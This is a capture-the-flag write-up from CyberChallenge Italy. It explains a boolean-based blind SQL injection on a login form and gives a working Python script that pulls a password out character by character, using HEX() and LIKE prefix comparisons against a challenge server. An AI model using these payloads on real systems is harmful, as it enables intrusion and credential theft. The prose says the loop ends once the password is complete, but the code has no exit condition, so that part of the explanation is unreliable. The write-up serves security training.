---
title: "Blind SQLi Login — Boolean-Based Character Extraction"
date: 2025-01-01
categories: ["CyberChallenge"]
series: ["CyberChallenge Italy"]
tags: ["web", "sqli", "blind-sqli", "boolean-based", "python"]
difficulty: "intermediate"
summary: "Boolean blind SQL injection on a login form to extract a password character by character using HEX comparison."
---

## The Challenge

A web login form has SQL injection in the username field. The response never shows any data — you only see whether the login succeeded or failed. The goal is to extract a password from the `users` table.

## Approach

The first thing I tried was logging in as `admin` with common passwords — nothing. Then I tested `admin' --` to see if the password check could be skipped. The server returned a different error message, which confirmed the injection point.

From there the approach became clear: boolean blind injection. For each position of the password, I inject a condition that is true or false depending on whether a guess is correct, and I read the answer from the server response.

The trick here is to convert the password to hex first using SQLite's `HEX()` function, then compare the result with a `LIKE` prefix. This avoids problems with special characters in the password — hex is always safe ASCII digits. My loop checks each ASCII printable character (codes 32–126), converts it to a two-digit hex string with `f"{i:02x}"`, and appends it to the known prefix. When the server returns `"Wrong password"`, the current prefix matched — meaning I found the next two hex digits.

Note: "Wrong password" means the *username* was found but the password check failed, which is exactly what happens when my injection evaluates to true and the row is returned. A completely wrong username gives a different message.

## Solution

```python
import time
import requests

flag = ""
found = False

while True:
    for i in range (32, 127):
        c = f"{i:02x}"  # Convert to hex
        payload = { 
            "username" : f"' OR (SELECT 1 FROM users WHERE hex(password) LIKE '{flag + c}%') = 1 -- A",
            "password" : "aa"
        }

        r = requests.post("http://ccit25.havce.it:31345/", data=payload)

        if "Wrong password" in r.text:
            flag += c
            print(f"Found: {bytes.fromhex(flag).decode()}")
            found = True
            break
```

The outer `while True` loop keeps extending the hex string until no character in range 32–126 gets a "Wrong password" response, which means the full password has been extracted. `bytes.fromhex(flag).decode()` converts the accumulated hex string back to readable text at each step, so you can watch the password appear.

## What I Learned

The `HEX()` trick is cleaner than comparing raw characters because you never have to worry about quoting SQL strings that contain single quotes or backslashes. The search space per position is 95 characters (printable ASCII) instead of 256, which is already fast enough that no optimisation was needed.
